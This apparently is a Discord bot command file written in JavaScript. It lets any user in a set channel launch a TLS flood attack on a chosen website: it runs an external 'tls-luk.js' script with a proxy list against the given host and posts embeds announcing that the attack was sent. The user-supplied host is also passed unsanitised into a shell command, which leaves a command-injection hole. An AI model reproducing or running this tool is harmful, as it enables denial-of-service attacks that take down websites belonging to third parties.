const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex .tls-luk https://example.com/`")
	.setFooter("Please do not attack government website!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`timeout 60 node tls-luk.js ${host} 60 64 8 http.txt`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **The Attack Was Sent To Website** 🚀')
	.setTimestamp()
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://media2.giphy.com/media/mBiXF8LBUMBmaiIrJj/giphy.gif?cid=5e21488601ae79b24c76a3829eb0d2140e77bfb0681ca3af&rid=giphy.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media2.giphy.com/media/mBiXF8LBUMBmaiIrJj/giphy.gif?cid=5e21488601ae79b24c76a3829eb0d2140e77bfb0681ca3af&rid=giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **Attack Under Review** 🚀')
	.setTimestamp()
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['tls-luk'],
  permLevel: 0
}

exports.help = {
  name: 'tls-l',
  description: 'zxcr9999',
  usage: 'browser'
}